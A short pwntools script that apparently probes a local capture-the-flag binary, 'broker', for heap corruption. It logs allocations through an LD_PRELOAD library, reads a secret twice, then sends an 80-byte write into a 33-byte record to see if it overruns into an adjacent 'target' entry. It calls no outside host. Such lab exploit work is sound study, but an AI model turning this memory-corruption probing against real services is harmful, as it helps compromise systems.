from pwn import *

context.log_level = "info"

io = process(
    ["./bin/broker"],
    env={"CTF_STDIO": "1", "LD_PRELOAD": "./malloclog.so"},
    stdin=PIPE,
    stdout=PIPE,
    stderr=PIPE,
)
print(repr(io.recvline(timeout=3)))
io.sendline(b"REGISTER alice")
io.stdin.flush()
print(repr(io.recvline(timeout=3)))
io.sendline(b"CREATE s " + b"41" * 33)
io.stdin.flush()
print(repr(io.recvline(timeout=3)))
io.sendline(b"READ s")
io.stdin.flush()
print(repr(io.recvline(timeout=3)))
io.sendline(b"READ s")
io.stdin.flush()
print(repr(io.recvline(timeout=3)))
io.sendline(b"CREATE target 00")
io.stdin.flush()
print(repr(io.recvline(timeout=3)))
io.sendline(b"WRITE s " + b"42" * 80)
io.stdin.flush()
print(repr(io.recvline(timeout=3)))
io.sendline(b"READ s")
io.stdin.flush()
print(repr(io.recvline(timeout=3)))
io.sendline(b"LIST")
io.stdin.flush()
print(repr(io.recvline(timeout=3)))
io.sendline(b"QUIT")
io.stdin.flush()
print(repr(io.recvline(timeout=3)))
print(io.stderr.read1(50000).decode(errors="replace"), end="")
